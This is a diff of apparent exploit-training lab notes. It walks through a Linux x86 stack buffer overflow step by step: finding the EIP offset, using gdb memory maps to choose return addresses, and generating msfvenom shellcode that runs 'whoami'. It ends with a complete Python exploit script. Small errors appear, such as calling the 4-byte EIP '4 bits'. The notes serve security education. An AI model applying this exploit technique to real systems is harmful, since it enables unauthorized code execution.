@@ -313,13 +313,14 @@ DAY5
                            EIP: 0x31634130 ('0Ac1')
                            EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
                       - paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-                        - this will show you the offset
+                        - this will show you the offset, line 3 places 4 bits (length of EIP) at the end of the offset for verification
                                   1 buf = "A" * 62                                                                                                                                                                                                 
                                   2 
                                   3 eip = "B" * 4
                                   4 
                                   5 print(buf + eip)
-                              - 
+                              -  gdb-peda$ run <<< $(python /home/student/Downloadsfuncballs.py)
+                                - make sure EIP is : 0x12345678 ('BBBB')
                         
                         
                   env - gdb func
@@ -335,7 +336,7 @@ DAY5
 
                   Program received signal SIGSEGV, Segmentation fault.
                   0x61616161 in ?? ()
-                  (gdb) info proc map
+                  (gdb) info proc map  ***** has to be done on TARGET machine
                   process 14774
                   Mapped address spaces:
 
@@ -378,10 +379,48 @@ DAY5
                         0xf7f91df7
                         0xf7f99177
 
-      
-      
-      
-      
+                    1 buf = "A" * 62
+                    2 
+                    3 eip = "\x1f\xce\xf6\xf7" 
+                    4 '''
+                    5 0xf7f6ce1f
+                    6 0xf7f6cf87
+                    7 0xf7f6d04f
+                    8 0xf7f6d10f
+                    9 '''                                                                                                                                                                                                            
+                   10 print(buf + eip)
+
+                  msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+
+                     buf =  b""
+                     buf += b"\xbf\x40\x15\x40\x1a\xd9\xeb\xd9\x74\x24\xf4\x58\x33"
+                     buf += b"\xc9\xb1\x0b\x31\x78\x14\x03\x78\x14\x83\xc0\x04\xa2"
+                     buf += b"\xe0\x2a\x11\x7a\x92\xf9\x43\x12\x89\x9e\x02\x05\xb9"
+                     buf += b"\x4f\x66\xa1\x3a\xf8\xa7\x53\x52\x96\x3e\x70\xf6\x8e"
+                     buf += b"\x46\x76\xf7\x4e\x3e\x1e\x98\x2f\xad\xb7\x66\xe7\x7e"
+                     buf += b"\xce\x86\xca\x01"
+
+                 1 buff = "A" * 62
+                 2 
+                 3 eip = "\x1f\xce\xf6\xf7"
+                 4 '''
+                 5 0xf7f6ce1f
+                 6 0xf7f6cf87
+                 7 0xf7f6d04f
+                 8 0xf7f6d10f                                                                                                                                                                                                     
+                 9 '''
+                10 
+                11 buf =  b""
+                12 buf += b"\xbf\x40\x15\x40\x1a\xd9\xeb\xd9\x74\x24\xf4\x58\x33"
+                13 buf += b"\xc9\xb1\x0b\x31\x78\x14\x03\x78\x14\x83\xc0\x04\xa2"
+                14 buf += b"\xe0\x2a\x11\x7a\x92\xf9\x43\x12\x89\x9e\x02\x05\xb9"
+                15 buf += b"\x4f\x66\xa1\x3a\xf8\xa7\x53\x52\x96\x3e\x70\xf6\x8e"
+                16 buf += b"\x46\x76\xf7\x4e\x3e\x1e\x98\x2f\xad\xb7\x66\xe7\x7e"
+                17 buf += b"\xce\x86\xca\x01"
+                18 
+                19 
+                20 print(buff + eip + buf)
+
       
       
       
